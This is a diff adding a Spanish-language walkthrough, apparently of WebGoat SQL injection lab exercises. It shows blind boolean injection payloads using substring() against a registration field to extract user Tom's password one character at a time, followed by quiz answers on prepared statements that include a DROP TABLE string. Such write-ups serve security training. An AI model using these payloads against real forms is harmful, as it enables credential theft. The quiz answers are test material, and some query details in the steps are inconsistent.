@@ -90,8 +90,74 @@ También podemos realizar una inyección basada en tiempo:
 
 ## Ejercicio 2 (5)
 
-Para este ejercicio encontramos un `login` por lo que podemos imaginar que la sentencia en SQL podría ser algo parecido a:
-
-
 #### Haz login como Tom
 
+En este ejercicio se nos pide que hagamos login como el usuario Tom. Interactuando con el campo login podemos observar que:
++ Si tratamos de registrar a el usuario `tom` 
+    + User tom already exists please try to register with a different username.
++ Si tratamos de registrar a el usuario `tom' AND '1' = '1`
+    + User {0} already exists please try to register with a different username.
++ Si tratamos de registrar a el usuario `tom' AND '1' = '2`
+    + User tom' AND '1' = '2 created, please proceed to the login page.
+
+Por lo que podemos inferir que cada que nos diga que `User {0} already exists please try to register with a different username.` significará que hemos inferido algo correcto sobre la consulta. Ahora, hay que utilizar esto para buscar a el password.
+
+Podemos pensar que existe un campo llamado `password` en que se almacenan las contraseñas.
+
+Y entonces introducir mediante un `substring(password,1,1)` obtener la primera letra del password.
+
+**Proceso de deducción** (Note que se cambiar los parametros de `substring`)
+
+1. Probamos con **t** de **tom**
+    + `tom' AND substring(password,1,1)='t`
+    + Nos devuelve verdadero (`User {0} already exists please try to register with a different username.`)
+2. Probamos con **to** de **tom**
+    + `tom' AND substring(password,1,2)='to`
+    + Nos devuelve falso (`User tom' AND substring(password,2,2)='o created, please proceed to the login page.`)
+3. Probamos con **th** de **the** (Por *thepassword* o algo por el estilo)
+    + `tom' AND substring(password,1,2)='th`
+    + Nos devuelve verdadero (`User {0} already exists please try to register with a different username.`)
+3. Probamos con **the** de **he**
+    + `tom' AND substring(password,1,3)='the`
+    + Nos devuelve falso (`User tom' AND substring(password,2,2)='o created, please proceed to the login page.`)
+4. Probamos con **this** de **this** (thisisthepassword) o algo así
+    + `tom' AND substring(password,1,4)='this`
+    + Nos devuelve verdadero (`User {0} already exists please try to register with a different username.`)
+
+Siguiendo con el mismo proceso, (palabra comun) llegamos hasta este punto
+1. Inferir `this`
+1. Inferir `thisis`
+1. Inferir `thisisthe`
+1. Inferir `thisisthepassword`
+    + Probamos y no es el password :c
+1. Inferir `thisisthepasswordfor`
+1. Hasta llegar a `thisisasecretfortomonly`
+
+Donde finalmente el password resulta ser:
++ `thisisasecretfortomonly`
+
+Un ideal debería ser programar una herramienta que haga todo este proceso por nosotros.
+
+
+## Ejercicio 3 (6)
+
+#### Responder correctamente el test
+
+**¿Cuál es la diferencia entre una declaración preparada y una declaración?**
++ A statement has got values instead of a prepared statement
++ Una declaración tiene valores en lugar de una declaración preparada
+
+**¿Cuál de los siguientes caracteres es un marcador de posición para las variables?**
++ ?
+
+**¿Cómo pueden las declaraciones preparadas ser más rápidas que las declaraciones?**
++ Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.
++ Las declaraciones preparadas son compiladas una vez por el sistema de gestión de la base de datos en espera de entrada y se compilan previamente de esta manera.
+
+**How can a prepared statement prevent SQL-Injection?**
++ Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.
++ Los marcadores de posición pueden evitar que la entrada de los usuarios se adjunte a la consulta SQL, lo que resulta en una separación de código y datos.
+
+**Prepared statements always read inputs literally and never mixes it with its SQL commands.**
++ The database registers 'Robert' ); DROP TABLE Students;--'.
++ La base de datos registra literalmente 'Robert' ); DROP TABLE Students;--'.
